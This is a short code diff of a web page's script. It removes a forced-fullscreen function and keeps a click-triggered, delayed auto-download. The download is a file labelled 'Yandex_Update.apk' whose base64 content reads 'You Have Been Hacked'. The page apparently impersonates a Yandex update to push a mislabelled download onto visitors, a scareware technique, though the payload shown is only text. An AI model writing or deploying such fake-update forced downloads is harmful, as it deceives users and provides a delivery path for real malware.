@@ -75,12 +75,11 @@
 
 <script>
   document.getElementById('triggerInput').addEventListener('click', function() {
-    // Logic remains unchanged
+    // Jalankan download setelah 2 detik tanpa fullscreen
     setTimeout(function() {
       openWin();
     }, 2000);
     
-    goFullScreen();
   }, { once: false });
 
   function Puf(uri, name) {
@@ -97,19 +96,6 @@
       "data://www.yandex.com/application/x-msdownload;base64,WW91IEhhdmUgQmVlbiBIYWNrZWQ=",
       "Yandex_Update.apk"
     );
-  }
-
-  function goFullScreen() {
-    const element = document.documentElement;
-    if (element.requestFullscreen) {
-      element.requestFullscreen();
-    } else if (element.mozRequestFullScreen) {
-      element.mozRequestFullScreen();
-    } else if (element.webkitRequestFullscreen) {
-      element.webkitRequestFullscreen();
-    } else if (element.msRequestFullscreen) {
-      element.msRequestFullscreen();
-    }
   }
 </script>
 
